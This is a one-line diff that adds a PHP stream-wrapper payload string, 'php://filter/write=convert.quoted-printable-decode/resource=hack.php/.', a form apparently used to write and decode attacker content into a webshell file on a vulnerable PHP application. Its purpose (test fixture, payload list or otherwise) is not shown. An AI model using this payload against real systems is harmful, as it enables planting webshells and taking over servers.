@@ -1,0 +1,1 @@
+php://filter/write=convert.quoted-printable-decode/resource=hack.php/.
